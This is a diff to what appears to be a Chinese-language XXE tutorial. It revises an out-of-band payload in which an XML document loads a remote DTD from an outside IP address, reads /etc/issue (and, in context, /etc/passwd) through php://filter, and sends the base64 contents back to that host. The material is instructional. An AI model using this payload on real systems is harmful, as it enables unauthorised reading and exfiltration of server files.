@@ -83,18 +83,16 @@ evil.dtd中的内容为：```<!ENTITY b SYSTEM "file:///etc/passwd">```
 ```
 <?xml version="1.0" encoding="utf-8"?>
 <!DOCTYPE xxe [
-    <!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/issue">
     <!ENTITY % remote SYSTEM "http://114.115.183.86/wyb/evil.dtd">
     %remote;
-    %send;
 ]>
 ```
 evil.dtd内容：
 ```
-<!ENTITY % all
-"<!ENTITY &#x25; send SYSTEM 'http://114.115.183.86/?%file;'>"
->
+<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/issue">
+<!ENTITY % all "<!ENTITY &#37; send SYSTEM 'http://114.115.183.86/?%file;'>">
 %all;
+%send;
 ```
 
 * 方法二：
